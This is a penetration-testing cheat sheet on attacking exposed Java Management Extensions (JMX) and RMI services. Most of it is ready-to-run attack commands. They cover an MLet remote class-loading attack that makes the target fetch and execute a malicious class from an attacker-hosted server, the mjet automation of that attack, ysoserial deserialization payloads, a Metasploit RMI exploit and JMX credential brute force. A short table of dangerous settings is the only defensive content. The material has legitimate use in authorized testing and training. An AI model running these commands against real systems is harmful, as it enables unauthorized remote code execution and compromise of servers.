#JMX #JavaManagementExtensions #Java #RMI #RCE #webservices

## What is JMX?
Java Management Extensions — Java framework for monitoring and management. Uses RMI (Remote Method Invocation) for remote access. JMX agents expose MBeans (Managed Beans) via RMI registry. If unauthenticated, attackers can invoke arbitrary MBeans including those that execute OS commands or load remote classes (MLet attack).

- Port: **TCP 1099** — RMI registry (common default)
- Port: **TCP 1098** — RMI object port
- Alternate: 7199 (Cassandra JMX), 9999, 11099 — varies by app
- Authentication: optional (often disabled)

---

## Enumeration

```bash
# Nmap
nmap -p 1099,1098 --script rmi-dumpregistry,rmi-vuln-classloader -sV <target>
nmap -p 1099 -sV <target>

# Check if RMI registry responds
java -jar rmg.jar enum <target> 1099   # remote-method-guesser

# rlwrap + rmiregistry probe
```

---

## Connect / Access

```bash
# jconsole (GUI) — built into JDK
jconsole <target>:1099
jconsole service:jmx:rmi://<target>/jndi/rmi://<target>:1099/jmxrmi

# jmxterm (CLI tool)
# https://sourceforge.net/projects/cyclops-group/files/jmxterm/
java -jar jmxterm.jar
open <target>:1099
domains
beans

# With credentials
jconsole -J-Djava.class.path=jconsole.jar <target>:1099
```

---

## Attack Vectors

### MLet Attack (Remote Class Loading → RCE)

The MLet (Management Applet) MBean loads classes from a URL. Attackers host a malicious class file and use JMX to load and execute it.

```bash
# Prerequisites: unauthenticated JMX, outbound HTTP from target

# Step 1: Create malicious MBean
# RCEMBean.java:
# public interface RCEMBean { void exploit() throws Exception; }
# RCE.java: exec command in exploit()

# Step 2: Create MLet HTML file on attacker HTTP server
cat > mlet.html << 'EOF'
<html>
<mlet code="RCE" archive="RCE.jar" name="exploit:name=rce" codebase="http://<attacker_ip>:8080">
</mlet>
</html>
EOF

# Step 3: Host files
python3 -m http.server 8080

# Step 4: Trigger via jmxterm
open <target>:1099
bean DefaultDomain:type=MLet
run getMBeansFromURL http://<attacker_ip>:8080/mlet.html
bean exploit:name=rce
run exploit

# Automated — mjet
# https://github.com/mogwaisec/mjet
python3 mjet.py --jmxhost <target> --jmxport 1099 --attack mlet --payload_url http://<attacker_ip>:8080/mlet.html
```

### Invoke Existing MBeans

```bash
# jconsole or jmxterm — browse existing MBeans for dangerous operations
# Common dangerous MBeans:
# - DiagnosticCommand (JDK Mission Control) — arbitrary JVM commands
# - Threading — thread dumps (info disclosure)
# - ClassLoading — load classes
# - Runtime.exec equivalents in app-specific MBeans

# Via jmxterm:
open <target>:1099
domains
beans
bean <domain>:<name>
info   # list attributes/operations
run <operation> [args]
```

### Deserialization via RMI

```bash
# If RMI endpoint deserializes untrusted data:
# ysoserial + rmg (remote-method-guesser)
java -jar rmg.jar guess <target> 1099
java -jar rmg.jar call <target> 1099 <method> --payload ysoserial.CommonsCollections6 "id"

# Metasploit
use exploit/multi/misc/java_rmi_server
set RHOSTS <target>
set RPORT 1099
run
```

### JMX Brute Force (if auth enabled)

```bash
# mjet brute force
python3 mjet.py --jmxhost <target> --jmxport 1099 --attack bruteforce --usernames users.txt --passwords passwords.txt
```

### Cassandra JMX (Port 7199)

```bash
# Cassandra exposes JMX on 7199 — often with no auth
# nodetool uses JMX under the hood
nodetool -h <target> -p 7199 status
nodetool -h <target> -p 7199 info
nodetool -h <target> -p 7199 describecluster
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No JMX authentication | Full MBean access → RCE via MLet |
| RMI registry exposed to network | Remote class loading |
| Old JVM version | Deserialization gadget chains |
| MLet available without auth | Direct remote class loading |
| App-specific dangerous MBeans | RCE via invoke |

---

## Quick Reference

| Goal | Command |
|---|---|
| Detect | `nmap -p 1099 -sV host` |
| RMI registry dump | `nmap -p 1099 --script rmi-dumpregistry host` |
| Connect (GUI) | `jconsole host:1099` |
| Connect (CLI) | `java -jar jmxterm.jar` → `open host:1099` |
| MLet attack | `python3 mjet.py --jmxhost host --jmxport 1099 --attack mlet --payload_url http://attacker/mlet.html` |
| MSF deserialization | `exploit/multi/misc/java_rmi_server` |
| Cassandra | `nodetool -h host -p 7199 status` |
